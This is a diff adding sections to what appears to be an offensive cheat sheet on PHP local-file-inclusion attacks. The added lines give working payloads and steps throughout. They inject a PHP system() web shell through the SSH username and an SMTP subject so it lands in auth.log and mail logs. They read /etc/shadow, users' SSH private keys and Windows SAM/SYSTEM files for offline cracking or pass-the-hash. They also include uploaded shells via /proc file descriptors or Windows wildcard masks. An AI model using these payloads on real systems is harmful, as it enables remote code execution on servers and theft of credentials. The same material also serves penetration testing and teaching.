@@ -99,7 +99,35 @@ Put `<?php system($_GET['c']); ?>` into a logged field (User-Agent, or the `Auth
 /var/log/apache2/error.log      /var/log/nginx/access.log
 /var/log/nginx/error.log        /var/log/httpd/error_log
 /var/log/vsftpd.log             # inject shell into FTP username field
-/var/mail/<USER>  /var/spool/mail/<USER>   # mail body shell via SMTP to user@localhost
+/var/log/auth.log  /var/log/sshd.log   # SSH: shell goes in the USERNAME
+/var/log/mail  /var/mail/<USER>  /var/spool/mail/<USER>   # mail body shell via SMTP to user@localhost
+```
+
+**SSH-username vector** — ssh in with the PHP as the username (the failed
+login is written verbatim to `auth.log`), then include the log:
+
+```bash
+ssh '<?php system($_GET["cmd"]);?>'@TARGET   # connection fails, but the line is logged
+# then: ?page=/var/log/auth.log&cmd=id
+```
+
+**Mail vector** — `telnet TARGET 25`, send a message whose `subject:` is
+`<?php system($_GET["cmd"]); ?>` to a local user, then include
+`/var/log/mail` (or `/var/spool/mail/<user>`).
+
+## Credential-file extraction (read, then crack offline)
+
+When the LFI can read privileged files, pull hashes and keys directly —
+no RCE needed:
+
+```
+# Linux: crack these or reuse the SSH key
+/etc/shadow
+/home/<user>/.ssh/id_rsa     # enumerate users from /etc/passwd first
+
+# Windows: extract SAM + SYSTEM, then `samdump2 SYSTEM SAM`, crack/pass-the-hash
+../../../../../../WINDOWS/repair/sam
+../../../../../../WINDOWS/repair/system
 ```
 
 Read access logs to harvest GET-leaked tokens, then replay:
@@ -135,6 +163,8 @@ lang=/../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27
   GET /index.php?+config-create+/&file=/usr/local/lib/php/pearcmd.php&/<?=phpinfo()?>+/tmp/hello.php
   ```
 - **Nginx temp files** / **phpinfo() + file_uploads=on** / **segmentation-fault temp-file survival** — each lets an uploaded `/tmp/php*` temp file be included before deletion; brute-force the temp name (or hang execution to widen the window).
+- **`/proc/$PID/fd/$FD` shell flood** — upload many shells (e.g. 100) so several stay open as file descriptors, then include `/proc/$PID/fd/$FD`; both `$PID` and `$FD` are small integers, brute-force them. Works when uploads land in an unpredictable path but the FDs are still open.
+- **Windows FindFirstFile mask** — on Windows, include the uploaded temp file by wildcard instead of guessing its name: `?inc=c:\windows\temp\php<<` (`<<`=`*`, `>`=`?`). Avoids the 65536-name brute force.
 
 ## LFI-to-RCE via arbitrary write (traversal in a writer → webshell)
 
